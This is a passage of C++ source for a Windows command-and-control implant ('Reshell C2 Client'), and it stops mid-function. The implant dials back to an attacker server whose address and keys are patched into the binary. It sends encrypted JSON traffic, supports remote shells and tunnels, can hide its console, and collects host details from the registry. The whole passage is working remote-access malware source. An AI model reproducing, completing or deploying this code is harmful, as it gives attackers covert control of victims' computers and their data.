/*
 * Reshell C2 Client（Windows，MinGW/MSVC）
 * 与 client_linux.cpp（同目录）协议一致：TCP 一行 JSON、可选 AES-256-GCM（与 Go internal/agent/crypto.go 一致）、
 * /ws/agent 业务通道；隧道数据走 TCP。
 * 回连参数来自 c2_embed_config.h（C2EMBED1…C2EMBED2 块由服务端修补）。
 */
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00
#endif
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <bcrypt.h>
#include <gdiplus.h>
#include <objidl.h>

#include <atomic>
#include <chrono>
#include <map>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#ifndef PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE
#define PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE 0x00020016
#endif

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#include "c2_embed_config.h"

// 非 const，避免编译器把嵌入配置当成编译期常量；真实值以磁盘修补 + 映像扫描为准。
static C2EmbedConfig g_c2_embed = C2_EMBED_CONFIG_TEMPLATE_INIT;

#define SERVER_ADDR (reinterpret_cast<const char*>(g_c2_embed.host))
#define SERVER_PORT ((int)g_c2_embed.port_le)
#define VKEY (reinterpret_cast<const char*>(g_c2_embed.vkey))
#define SALT (reinterpret_cast<const char*>(g_c2_embed.salt))
#define HEARTBEAT_INTERVAL ((int)g_c2_embed.heartbeat_sec)
#define C2_WEB_HOST_STR (reinterpret_cast<const char*>(g_c2_embed.web_host))
#define C2_WEB_PORT ((int)g_c2_embed.web_port_le)

static const size_t kFileChunkSize = 256U * 1024U;

static std::mutex g_mu;
static std::mutex g_tcp_mu;
static SOCKET g_socket = INVALID_SOCKET;
static SOCKET g_ws = INVALID_SOCKET;
static std::atomic<bool> g_use_ws{false};
static std::atomic<bool> g_running{true};
static std::atomic<int> g_hb_run{0}; // 0=stop heartbeat thread
static int g_hb_val = 0;
static std::map<std::string, SOCKET> g_tunnels;
static std::mutex g_tunnel_mu;

static void channel_send(const std::string& json);
static bool ws_send_frame_text_unlocked(SOCKET s, const std::string& text);
static std::string resolve_ws_host(const std::string& wh);

// ---------- 调试输出 ----------
// 不在无控制台时调用 AllocConsole：PE 子系统改为 GUI 后加载器本就不建控制台，若此处再
// AllocConsole，会主动弹出窗口，与「隐藏控制台」载荷选项完全抵消。CUI 进程由系统附带控制台，
// GetConsoleWindow() 非空，printf 仍正常；纯 GUI 运行时调试输出无可见窗口（可用调试器查看）。
static std::mutex g_dbg_mu;
static void agent_dbg(const char* fmt, ...) {
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    std::lock_guard<std::mutex> lk(g_dbg_mu);
    printf("[c2-agent] %s\n", buf);
    fflush(stdout);
}

// 交互 Shell 排查：打印不可见字符为 \xNN，避免控制台乱码。
static void agent_dbg_bytes(const char* tag, const std::string& s, size_t maxShow = 96) {
    std::string esc;
    size_t n = s.size() < maxShow ? s.size() : maxShow;
    for (size_t i = 0; i < n; ++i) {
        unsigned char c = (unsigned char)s[i];
        if (c >= 32 && c < 127 && c != '\\')
            esc += (char)c;
        else {
            char b[8];
            snprintf(b, sizeof(b), "\\x%02x", c);
            esc += b;
        }
    }
    if (s.size() > maxShow) esc += "...";
    agent_dbg("%s len=%zu [%s]", tag, s.size(), esc.c_str());
}

// 启动时打印嵌入块（与载荷生成器 PatchC2Embed 写入字段一致），用于核对是否打补丁到正确偏移。
static std::string embed_zstr(const char* p, size_t cap) {
    size_t n = 0;
    while (n < cap && p[n]) ++n;
    return std::string(p, n);
}

// 与载荷里冗余的 "host:port" / "[ipv6]:port" 一致（对应 Go net.JoinHostPort）。
static bool split_host_port_str(const std::string& ep, std::string& out_h, int& out_p) {
    if (ep.empty()) return false;
    if (ep[0] == '[') {
        size_t br = ep.find(']');
        if (br == std::string::npos || br + 1 >= ep.size() || ep[br + 1] != ':') return false;
        const char* ps = ep.c_str() + br + 2;
        char* eptr = nullptr;
        long pv = strtol(ps, &eptr, 10);
        if (eptr == ps || pv < 1 || pv > 65535) return false;
        out_h = ep.substr(1, br - 1);
        out_p = (int)pv;
        return !out_h.empty();
    }
    size_t pos = ep.rfind(':');
    if (pos == std::string::npos || pos + 1 >= ep.size()) return false;
    for (size_t i = pos + 1; i < ep.size(); ++i) {
        if (ep[i] < '0' || ep[i] > '9') return false;
    }
    int pv = atoi(ep.c_str() + pos + 1);
    if (pv < 1 || pv > 65535) return false;
    out_h = ep.substr(0, pos);
    if (out_h.empty()) return false;
    out_p = pv;
    return true;
}

// ---------- 运行时从 PE 映像扫描 C2EMBED1（与 Go FindPatchOffset 思路一致，避免补丁打到别处置而 g_c2_embed 符号仍像模板） ----------
static bool host64_all_zero(const unsigned char* p) {
    for (int k = 0; k < 64; k++)
        if (p[k]) return false;
    return true;
}

static bool is_c2_template_block(const unsigned char* b) {
    if (memcmp(b, "C2EMBED1", 8) != 0) return false;
    if (memcmp(b + 404, "C2EMBED2", 8) != 0) return false;
    if (!host64_all_zero(b + 8)) return false;
    uint32_t tp, wp;
    memcpy(&tp, b + 72, 4);
    memcpy(&wp, b + 400, 4);
    if (tp != 0 || wp != 0) return false;
    if (b[76] != 0 || b[204] != 0) return false;
    if (!host64_all_zero(b + 336)) return false;
    return true;
}

static bool block_looks_patched(const unsigned char* b) {
    uint32_t tp;
    memcpy(&tp, b + 72, 4);
    if (tp != 0) return true;
    for (int k = 0; k < 64; k++)
        if (b[8 + k] == ':') return true;
    if (b[76] != 0) return true;
    if (b[204] != 0) return true;
    for (int k = 0; k < 64; k++)
        if (b[336 + k] == ':') return true;
    uint32_t wp;
    memcpy(&wp, b + 400, 4);
    return wp != 0;
}

static bool c2_runtime_scan_pick(const unsigned char** img_base, size_t* img_sz, size_t* off) {
    HMODULE mod = GetModuleHandleA(NULL);
    MODULEINFO mi;
    if (!GetModuleInformation(GetCurrentProcess(), mod, &mi, sizeof(mi))) return false;
    const unsigned char* img = (const unsigned char*)mi.lpBaseOfDll;
    size_t sz = (size_t)mi.SizeOfImage;
    if (!img || sz < 412) return false;
    std::vector<size_t> hits;
    for (size_t i = 0; i + 412 <= sz; i++) {
        if (memcmp(img + i, "C2EMBED1", 8) != 0) continue;
        if (memcmp(img + i + 404, "C2EMBED2", 8) != 0) continue;
        hits.push_back(i);
    }
    if (hits.empty()) return false;
    for (int j = (int)hits.size() - 1; j >= 0; j--) {
        if (block_looks_patched(img + hits[j])) {
            *off = hits[j];
            *img_base = img;
            *img_sz = sz;
            return true;
        }
    }
    for (int j = (int)hits.size() - 1; j >= 0; j--) {
        if (is_c2_template_block(img + hits[j])) {
            *off = hits[j];
            *img_base = img;
            *img_sz = sz;
            return true;
        }
    }
    *off = hits.back();
    *img_base = img;
    *img_sz = sz;
    return true;
}

static std::string c2_zstr64(const unsigned char* field) {
    size_t n = 0;
    while (n < 64 && field[n]) n++;
    return std::string(reinterpret_cast<const char*>(field), n);
}

static std::string embed_tcp_host_raw() {
    const unsigned char* img = nullptr;
    size_t sz = 0, off = 0;
    if (c2_runtime_scan_pick(&img, &sz, &off)) return c2_zstr64(img + off + 8);
    return embed_zstr(reinterpret_cast<const char*>(g_c2_embed.host), sizeof(g_c2_embed.host));
}

static uint32_t embed_tcp_port_le_raw() {
    const unsigned char* img = nullptr;
    size_t sz = 0, off = 0;
    if (c2_runtime_scan_pick(&img, &sz, &off)) {
        uint32_t p;
        memcpy(&p, img + off + 72, 4);
        return p;
    }
    uint32_t p;
    memcpy(&p, &g_c2_embed.port_le, sizeof(p));
    return p;
}

static std::string embed_web_host_raw() {
    const unsigned char* img = nullptr;
    size_t sz = 0, off = 0;
    if (c2_runtime_scan_pick(&img, &sz, &off)) return c2_zstr64(img + off + 336);
    return embed_zstr(reinterpret_cast<const char*>(g_c2_embed.web_host), sizeof(g_c2_embed.web_host));
}

static uint32_t embed_web_port_le_raw() {
    const unsigned char* img = nullptr;
    size_t sz = 0, off = 0;
    if (c2_runtime_scan_pick(&img, &sz, &off)) {
        uint32_t p;
        memcpy(&p, img + off + 400, 4);
        return p;
    }
    uint32_t p;
    memcpy(&p, &g_c2_embed.web_port_le, sizeof(p));
    return p;
}

static void resolve_tcp_dial(std::string& dial_host, int& dial_port) {
    std::string raw = embed_tcp_host_raw();
    int sp = (int)embed_tcp_port_le_raw();
    if (sp >= 1 && sp <= 65535) {
        std::string h;
        int unused = 0;
        if (split_host_port_str(raw, h, unused)) {
            dial_host = std::move(h);
        } else {
            dial_host = std::move(raw);
        }
        dial_port = sp;
        return;
    }
    std::string h;
    int p = 0;
    if (split_host_port_str(raw, h, p)) {
        dial_host = std::move(h);
        dial_port = p;
        return;
    }
    dial_host = std::move(raw);
    dial_port = sp;
}

static void resolve_ws_connect_params(const std::string& msg_wh, const std::string& msg_wp, std::string& out_host,
                                      int& out_port) {
    std::string wh = msg_wh.empty() ? embed_web_host_raw() : msg_wh;
    int wp = msg_wp.empty() ? 0 : atoi(msg_wp.c_str());
    if (wp < 1 || wp > 65535) {
        std::string h;
        int pp;
        if (split_host_port_str(wh, h, pp)) {
            wh = std::move(h);
            wp = pp;
        } else {
            wp = (int)embed_web_port_le_raw();
        }
    }
    if (wp < 1 || wp > 65535) {
        std::string h;
        int pp;
        if (split_host_port_str(embed_web_host_raw(), h, pp)) {
            if (wh == "127.0.0.1" || wh == "localhost" || wh == "::1") wh = std::move(h);
            wp = pp;
        }
    }
    out_host = resolve_ws_host(wh);
    out_port = wp;
}
static void embed_hex_line(const char* lab, const void* p, size_t nbyte) {
    const unsigned char* u = (const unsigned char*)p;
    char line[160];
    size_t pos = 0;
    for (size_t i = 0; i < nbyte && pos + 4 < sizeof(line); i++)
        pos += (size_t)snprintf(line + pos, sizeof(line) - pos, "%02x ", u[i]);
    if (pos && line[pos - 1] == ' ') line[pos - 1] = 0;
    agent_dbg("%s: %s", lab, line);
}

static void agent_dbg_dump_c2_embed() {
    const C2EmbedConfig& e = g_c2_embed;
    HMODULE mod = GetModuleHandleA(NULL);
    uintptr_t base = mod ? (uintptr_t)mod : 0;
    uintptr_t va = (uintptr_t)(const void*)&e;
    agent_dbg("--- C2 embed (server PatchC2Embed fields) ---");
    agent_dbg("g_c2_embed VA=%p image_base=%p RVA=0x%zx sizeof=%zu (Go TotalSize=412)",
              (void*)va, (void*)base, base ? (size_t)(va - base) : (size_t)0, sizeof(C2EmbedConfig));
    {
        const unsigned char* img = nullptr;
        size_t isz = 0, scan_rva = 0;
        if (c2_runtime_scan_pick(&img, &isz, &scan_rva)) {
            size_t sym_rva = base ? (size_t)(va - base) : 0;
            agent_dbg("runtime scan: C2 block RVA=0x%zx | symbol RVA=0x%zx | match=%d", scan_rva, sym_rva,
                      (base && scan_rva == sym_rva) ? 1 : 0);
            uint32_t scp = 0;
            memcpy(&scp, img + scan_rva + 72, 4);
            agent_dbg("scan view TCP host: [%s] port_le=%u", c2_zstr64(img + scan_rva + 8).c_str(), (unsigned)scp);
        } else {
            agent_dbg("runtime scan: FAILED (no C2EMBED1..2 in SizeOfImage)");
        }
    }

    embed_hex_line("magic[8] hex", e.magic, sizeof(e.magic));
    agent_dbg("magic[8] str: [%s] memcmp_ok=%d", embed_zstr(e.magic, sizeof(e.magic)).c_str(),
              memcmp(e.magic, "C2EMBED1", 8) == 0 ? 1 : 0);

    std::string h = embed_zstr(e.host, sizeof(e.host));
    std::string vk = embed_zstr(e.vkey, sizeof(e.vkey));
    std::string sl = embed_zstr(e.salt, sizeof(e.salt));
    std::string wh = embed_zstr(e.web_host, sizeof(e.web_host));
    agent_dbg("TCP host[64]: [%s]", h.c_str());
    agent_dbg("TCP port_le : %u (htons for dial)", (unsigned)e.port_le);
    embed_hex_line("vkey[128] first 32", e.vkey, vk.size() < 32 ? vk.size() : 32);
    agent_dbg("vkey        : len=%zu [%s]", vk.size(), vk.c_str());
    embed_hex_line("salt[128] first 32", e.salt, sl.size() < 32 ? sl.size() : 32);
    agent_dbg("salt        : len=%zu [%s]", sl.size(), sl.c_str());
    agent_dbg("heartbeat_sec: %u", (unsigned)e.heartbeat_sec);
    agent_dbg("web_host[64]: [%s]  web_port_le=%u", wh.c_str(), (unsigned)e.web_port_le);

    embed_hex_line("tail_magic[8] hex", e.tail_magic, sizeof(e.tail_magic));
    agent_dbg("tail_magic str: [%s] memcmp_ok=%d", embed_zstr(e.tail_magic, sizeof(e.tail_magic)).c_str(),
              memcmp(e.tail_magic, "C2EMBED2", 8) == 0 ? 1 : 0);

    int tcp_ok = (e.host[0] != 0 && e.port_le >= 1u && e.port_le <= 65535u);
    agent_dbg("tcp_ready=%d (raw port_le 1..65535)", tcp_ok);
    {
        std::string eff_h;
        int eff_p = 0;
        resolve_tcp_dial(eff_h, eff_p);
        agent_dbg("effective TCP dial: [%s]:%d (uses host:port in string if port_le broken)", eff_h.c_str(), eff_p);
        agent_dbg("tcp_ready_effective=%d", (!eff_h.empty() && eff_p >= 1 && eff_p <= 65535) ? 1 : 0);
    }
    agent_dbg("--- end embed dump ---");
}

// ---------- base64 ----------
static const char* B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static std::string b64_enc(const unsigned char* d, size_t n) {
    std::string r;
    r.reserve((n + 2) / 3 * 4);
    for (size_t i = 0; i < n; i += 3) {
        unsigned long v = (unsigned long)d[i] << 16;
        if (i + 1 < n) v |= (unsigned long)d[i + 1] << 8;
        if (i + 2 < n) v |= d[i + 2];
        r += B64[(v >> 18) & 63];
        r += B64[(v >> 12) & 63];
        r += (i + 1 < n) ? B64[(v >> 6) & 63] : '=';
        r += (i + 2 < n) ? B64[v & 63] : '=';
    }
    return r;
}
static int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}
static std::vector<BYTE> b64_dec(const std::string& s) {
    std::vector<BYTE> o;
    int buf = 0, bits = 0;
    for (char c : s) {
        if (c == '=') break;
        int v = b64_val(c);
        if (v < 0) continue;
        buf = (buf << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            o.push_back((BYTE)((buf >> bits) & 0xFF));
        }
    }
    return o;
}

// ---------- AES-256-GCM（BCrypt，与 Go agent/crypto 一致）----------
static bool use_enc() { return VKEY[0] && SALT[0]; }

static std::vector<BYTE> derive_key() {
    std::string raw = std::string(VKEY) + std::string(SALT);
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    std::vector<BYTE> key(32);
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0))) return key;
    if (!BCRYPT_SUCCESS(BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return key;
    }
    BCryptHashData(hHash, (PUCHAR)raw.data(), (ULONG)raw.size(), 0);
    BCryptFinishHash(hHash, key.data(), 32, 0);
    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return key;
}

static std::string encrypt_line(const std::string& plain_with_nl) {
    if (!use_enc()) return "";
    std::vector<BYTE> key = derive_key();
    if (key.size() != 32) return "";
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return "";
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key.data(), 32, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }
    UCHAR nonce[12];
    for (int i = 0; i < 12; i++) nonce[i] = (UCHAR)(rand() & 0xFF);
    ULONG ctLen = (ULONG)plain_with_nl.size();
    std::vector<BYTE> ct(ctLen);
    UCHAR tag[16] = {0};
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = nonce;
    ai.cbNonce = 12;
    ai.pbTag = tag;
    ai.cbTag = 16;
    ULONG done = 0;
    NTSTATUS st = BCryptEncrypt(hKey, (PUCHAR)plain_with_nl.data(), ctLen, &ai, NULL, 0, ct.data(), ctLen, &done, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (!BCRYPT_SUCCESS(st)) return "";
    std::vector<BYTE> out;
    out.insert(out.end(), nonce, nonce + 12);
    out.insert(out.end(), ct.begin(), ct.begin() + done);
    out.insert(out.end(), tag, tag + 16);
    return b64_enc(out.data(), out.size());
}

static std::string decrypt_line(const std::string& b64s) {
    if (!use_enc()) return b64s;
    std::vector<BYTE> raw = b64_dec(b64s);
    if (raw.size() < 12 + 16) return "";
    std::vector<BYTE> key = derive_key();
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return "";
    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key.data(), 32, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return "";
    }
    ULONG cLen = (ULONG)(raw.size() - 12 - 16);
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = raw.data();
    ai.cbNonce = 12;
    ai.pbTag = raw.data() + raw.size() - 16;
    ai.cbTag = 16;
    std::vector<BYTE> pt(cLen + 16);
    ULONG done = 0;
    NTSTATUS st = BCryptDecrypt(hKey, raw.data() + 12, cLen, &ai, NULL, 0, pt.data(), cLen, &done, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (!BCRYPT_SUCCESS(st)) return "";
    return std::string((char*)pt.data(), done);
}

// ---------- JSON ----------
static void json_esc(const std::string& s, std::string& o) {
    for (unsigned char c : s) {
        if (c == '"') o += "\\\"";
        else if (c == '\\') o += "\\\\";
        else if (c == '\n') o += "\\n";
        else if (c == '\r') o += "\\r";
        else if (c == '\t') o += "\\t";
        else if (c < 32) o += ' ';
        else o += (char)c;
    }
}

// shell 输出：须保留 ESC(0x1B) 等控制符为 JSON \u001b，否则 xterm 收不到 ANSI，屏幕上只剩裸的 [2J、[?25h 等。
static void json_esc_shell_data(const std::string& s, std::string& o) {
    for (size_t i = 0; i < s.size(); i++) {
        unsigned char c = (unsigned char)s[i];
        if (c == '"') o += "\\\"";
        else if (c == '\\') o += "\\\\";
        else if (c == '\n') o += "\\n";
        else if (c == '\r') o += "\\r";
        else if (c == '\t') o += "\\t";
        else if (c == 0x1b) o += "\\u001b";
        else if (c < 32) {
            char t[8];
            std::snprintf(t, sizeof(t), "\\u%04x", (unsigned)c);
            o += t;
        } else
            o += (char)c;
    }
}
static std::string json_obj(const std::map<std::string, std::string>& m) {
    std::string r = "{";
    bool f = true;
    for (auto& kv : m) {
        if (!f) r += ",";
        f = false;
        r += "\"";
        json_esc(kv.first, r);
        r += "\":\"";
        json_esc(kv.second, r);
        r += "\"";
    }
    r += "}";
    return r;
}

static void append_utf8_from_codepoint(std::string& val, unsigned cp) {
    if (cp > 0x10FFFFu) return;
    if (cp <= 0x7Fu) {
        val += (char)(unsigned char)cp;
    } else if (cp <= 0x7FFu) {
        val += (char)(0xC0u | (cp >> 6));
        val += (char)(0x80u | (cp & 0x3Fu));
    } else if (cp <= 0xFFFFu) {
        val += (char)(0xE0u | (cp >> 12));
        val += (char)(0x80u | ((cp >> 6) & 0x3Fu));
        val += (char)(0x80u | (cp & 0x3Fu));
    } else {
        val += (char)(0xF0u | (cp >> 18));
        val += (char)(0x80u | ((cp >> 12) & 0x3Fu));
        val += (char)(0x80u | ((cp >> 6) & 0x3Fu));
        val += (char)(0x80u | (cp & 0x3Fu));
    }
}

static void parse_json_str(const std::string& line, size_t& i, std::string& val) {
    while (i < line.size()) {
        if (line[i] == '\\' && i + 1 < line.size()) {
            char n = line[i + 1];
            if (n == '"' || n == '\\' || n == '/') {
                val += n;
            } else if (n == 'n') {
                val += '\n';
            } else if (n == 'r') {
                val += '\r';
            } else if (n == 't') {
                val += '\t';
            } else if (n == 'b') {
                val += '\b';
            } else if (n == 'f') {
                val += '\f';
            } else if (n == 'u' && i + 6 <= line.size()) {
                // Go encoding/json 常把退格编成 \u0008；须与 if (ok) 分开，避免 else 误挂到 if (ok) 上。
                unsigned cp = 0;
                bool ok = true;
                for (int k = 0; k < 4; k++) {
                    char h = line[i + 2 + (size_t)k];
                    unsigned v;
                    if (h >= '0' && h <= '9') v = (unsigned)(h - '0');
                    else if (h >= 'a' && h <= 'f') v = 10u + (unsigned)(h - 'a');
                    else if (h >= 'A' && h <= 'F') v = 10u + (unsigned)(h - 'A');
                    else {
                        ok = false;
                        break;
                    }
                    cp = cp * 16u + v;
                }
                if (ok) {
                    append_utf8_from_codepoint(val, cp);
                    i += 6;
                    continue;
                }
            }
            val += n;
            i += 2;
            continue;
        }
        if (line[i] == '"') return;
        val += line[i++];
    }
}

static bool parse_flat_json(const std::string& line, std::map<std::string, std::string>& msg) {
    msg.clear();
    size_t i = 0;
    auto skip = [&]() {
        while (i < line.size() && std::isspace((unsigned char)line[i])) i++;
    };
    skip();
    if (i >= line.size() || line[i] != '{') return false;
    i++;
    while (i < line.size()) {
        skip();
        if (i < line.size() && line[i] == '}') break;
        if (i >= line.size() || line[i] != '"') return false;
        i++;
        size_t ke = line.find('"', i);
        if (ke == std::string::npos) return false;
        std::string key = line.substr(i, ke - i);
        i = ke + 1;
        skip();
        if (i >= line.size() || line[i] != ':') return false;
        i++;
        skip();
        std::string val;
        if (i < line.size() && line[i] == '"') {
            i++;
            parse_json_str(line, i, val);
            if (i < line.size() && line[i] == '"') i++;
        } else {
            while (i < line.size() && line[i] != ',' && line[i] != '}') val += line[i++];
        }
        msg[key] = val;
        skip();
        if (i < line.size() && line[i] == ',') i++;
    }
    return !msg.empty();
}

// ---------- 网络行 ----------
static bool send_line_raw(SOCKET sock, const std::string& data) {
    std::string line = data + "\n";
    int sent = send(sock, line.data(), (int)line.size(), 0);
    return sent == (int)line.size();
}

static std::string recv_line_sock(SOCKET sock, int timeout_ms) {
    std::string result;
    char c;
    fd_set rf;
    timeval tv;
    while (true) {
        FD_ZERO(&rf);
        FD_SET(sock, &rf);
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        if (select(0, &rf, NULL, NULL, &tv) <= 0) return "";
        int n = recv(sock, &c, 1, 0);
        if (n <= 0) return "";
        if (c == '\n') break;
        if (c != '\r') result += c;
    }
    return result;
}

static bool send_line_secure(SOCKET sock, const std::string& data) {
    if (use_enc()) {
        std::string enc = encrypt_line(data + "\n");
        if (enc.empty()) return false;
        return send_line_raw(sock, enc);
    }
    return send_line_raw(sock, data);
}

static std::string recv_line_secure(SOCKET sock, int timeout_ms) {
    std::string line = recv_line_sock(sock, timeout_ms);
    if (line.empty()) return "";
    if (use_enc()) {
        std::string dec = decrypt_line(line);
        while (!dec.empty() && (dec.back() == '\n' || dec.back() == '\r')) dec.pop_back();
        return dec;
    }
    return line;
}

static bool send_line_tcp_unlocked(SOCKET fd, const std::string& json) {
    std::string line = json;
    if (use_enc()) {
        std::string enc = encrypt_line(json + "\n");
        if (enc.empty()) return false;
        line = enc;
    }
    line += "\n";
    const char* p = line.data();
    size_t n = line.size();
    while (n > 0) {
        int w = send(fd, p, (int)n, 0);
        if (w <= 0) return false;
        p += w;
        n -= (size_t)w;
    }
    return true;
}

static bool send_line_sec(SOCKET fd, const std::string& json) {
    std::lock_guard<std::mutex> lk(g_tcp_mu);
    return send_line_tcp_unlocked(fd, json);
}

// ---------- 系统信息（注册包实采）----------
static std::string wcs_to_utf8(const WCHAR* w, int cch = -1) {
    if (!w) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, w, cch, NULL, 0, NULL, NULL);
    if (n <= 0) return "";
    std::string s((size_t)n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w, cch, &s[0], n, NULL, NULL);
    while (!s.empty() && s.back() == '\0') s.pop_back();
    return s;
}

static std::string ansi_lower(std::string s) {
    for (char& c : s) {
        if (c >= 'A' && c <= 'Z') c = (char)(c + 32);
    }
    return s;
}

static bool reg_read_sz(HKEY root, const char* subkey, const char* valname, std::string& out) {
    HKEY hKey = NULL;
    if (RegOpenKeyExA(root, subkey, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS)
        return false;
    char buf[4096];
    DWORD sz = sizeof(buf), typ = 0;
    LONG r = RegQueryValueExA(hKey, valname, NULL, &typ, (LPBYTE)buf, &sz);
    RegCloseKey(hKey);
    if (r != ERROR_SUCCESS || (typ != REG_SZ && typ != REG_EXPAND_SZ)) return false;
    if (sz <= 1) return false;
    out.assign(buf, sz - 1);
    return true;
}

static std::string get_hostname_utf8() {
    WCHAR wbuf[256];
    DWORD wsz = sizeof(wbuf) / sizeof(wbuf[0]);
    if (GetComputerNameExW(ComputerNameDnsHostname, wbuf, &wsz) && wsz > 0) {
        std::string u = wcs_to_utf8(wbuf);
        if (!u.empty()) return u;
    }
    wsz = sizeof(wbuf) / sizeof(wbuf[0]);
    if (GetComputerNameW(wbuf, &wsz) && wsz > 0) return wcs_to_utf8(wbuf);
    char a[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD al = sizeof(a);
    if (GetComputerNameA(a, &al)) return std::string(a);
    return "unknown";
}

static std::string arch_key_from_si() {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            return "amd64";
        case PROCESSOR_ARCHITECTURE_ARM64:
            return "arm64";
        case PROCESSOR_ARCHITECTURE_INTEL:
            return "x86";
        default:
            return "unknown";
    }
}

static std::string get_cpu_model() {
    std::string s;
    if (reg_read_sz(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", s)) {
        while (!s.empty() && (s.back() == ' ' || s.back() == '\t')) s.pop_back();
        return s;
    }
    return "unknown";
}

static std::string get_os_version_display() {
    std::string pn, dv, cb;
    reg_read_sz(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", pn);
    reg_read_sz(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion", dv);
    reg_read_sz(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", cb);
    std::string o;
    if (!pn.empty()) o += pn;
    if (!dv.empty()) o += (o.empty() ? "" : " ") + dv;
    if (!cb.empty()) o += (o.empty() ? "" : " ") + std::string("(Build ") + cb + ")";
    if (o.empty()) return "Windows";
    return o;
}

static std::string get_primary_resolution() {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    char b[64];
    snprintf(b, sizeof(b), "%dx%d", w, h);
    return std::string(b);
}

static std::string collect_gpu_driver_desc() {
    std::string acc;
    HKEY hCls = NULL;
    const char* clsPath = "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, clsPath, 0, KEY_READ, &hCls) != ERROR_SUCCESS) return "";
    char sub[256];
    for (DWORD i = 0;; i++) {
        DWORD sl = sizeof(sub);
        if (RegEnumKeyExA(hCls, i, sub, &sl, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
        if (_stricmp(sub, "Properties") == 0) continue;
        std::string sk = std::string(clsPath) + "\\" + sub;
        std::string dd;
        if (!reg_read_sz(HKEY_LOCAL_MACHINE, sk.c_str(), "DriverDesc", dd)) continue;
        std::string dl = ansi_lower(dd);
        if (dl.find("microsoft basic render") != std::string::npos) continue;
        if (dd.find("Parsec Virtual") != std::string::npos) continue;
        if (!acc.empty()) acc += "; ";
        acc += dd;
        if (acc.size() > 900) break;
    }
    RegCloseKey(hCls);
